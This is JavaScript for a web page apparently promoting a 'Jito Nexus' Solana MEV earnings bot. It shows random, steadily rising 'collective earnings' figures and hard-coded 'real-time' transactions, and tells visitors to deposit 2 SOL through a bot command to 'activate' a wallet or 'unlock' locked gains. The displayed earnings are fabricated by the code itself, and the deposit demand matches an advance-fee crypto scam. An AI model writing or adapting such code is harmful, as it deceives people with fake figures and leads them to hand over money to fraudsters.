let currentBalance = 0;
let startTime = new Date();

document.addEventListener("DOMContentLoaded", function() {
    initializeApp();
    setInterval(updateApp, 1000); // Update every second
});

function initializeApp() {
    currentBalance = Math.random() * (16000 - 145) + 145;
    startTime = new Date();
    updateTodayStats();
    initializeWallet();
    updateMyGains();
    fetchNexusWalletTransactions();
    initializeStatsGraph();
}

function updateApp() {
    const now = new Date();
    if (now - startTime >= 24 * 60 * 60 * 1000) {
        initializeApp(); // Reset after 24 hours
    } else {
        updateTodayStats();
        fetchNexusWalletTransactions();
    }
}

function updateTodayStats() {
    currentBalance += Math.random() * 0.1; // Random increase
    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
    document.getElementById("stats-description").textContent = 
        `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
    updateStatsGraph();
}

function initializeWallet() {
    document.getElementById("wallet-instructions").textContent = 
        "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type /get_wallet. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
}

function updateMyGains() {
    const gainsContent = document.getElementById("gains-content");
    gainsContent.innerHTML = `
        <p>🔒 Locked: To access your gains, please deposit 2 SOL. Head to the bot and type /get_wallet to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!</p>
    `;
}

function fetchNexusWalletTransactions() {
    // Simulating real-time data
    const transactions = [
        { type: 'transfer', amount: 5.3, time: '3:00 PM', address: '9nG3A2K7...' },
        { type: 'swap', amount: 1000, time: '5:15 PM', address: 'Ai9n8R42...' }
    ];
    displayTransactions(transactions);
}

function displayTransactions(transactions) {
    const transactionsList = document.getElementById("transactions-list");
    transactionsList.innerHTML = "";
    transactions.forEach(tx => {
        const txElement = document.createElement("div");
        txElement.className = "transaction";
        if (tx.type === 'transfer') {
            txElement.innerHTML = `
                <h3>Nexus Wallet Transfer</h3>
                <p>Transaction: ${tx.amount} SOL transferred at ${tx.time}</p>
                <p>Address: ${tx.address} (recipient)</p>
            `;
        } else {
            txElement.innerHTML = `
                <h3>Nexus Wallet Attack</h3>
                <p>Token Swap: ${tx.amount} USDC swapped at ${tx.time}</p>
                <p>Address: ${tx.address} (initiated by Nexus)</p>
            `;
        }
        transactionsList.appendChild(txElement);
    });
}

function showTab(tabId) {
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.style.display = "none";
    }
    document.getElementById(tabId).style.display = "block";
}

function initializeStatsGraph() {
    const ctx = document.getElementById('stats-graph').getContext('2d');
    window.statsChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'SOL Balance',
                data: [],
                borderColor: 'rgba(0, 255, 255, 1)',
                borderWidth: 2,
                fill: false
            }]
        },
        options: {
            responsive: true,
            animation: {
                duration: 0
            },
            scales: {
                y: {
                    beginAtZero: false
                }
            }
        }
    });
}

function updateStatsGraph() {
    const chart = window.statsChart;
    const now = new Date();
    chart.data.labels.push(now.toLocaleTimeString());
    chart.data.datasets[0].data.push(currentBalance);
    if (chart.data.labels.length > 50) {
        chart.data.labels.shift();
        chart.data.datasets[0].data.shift();
    }
    chart.update();
}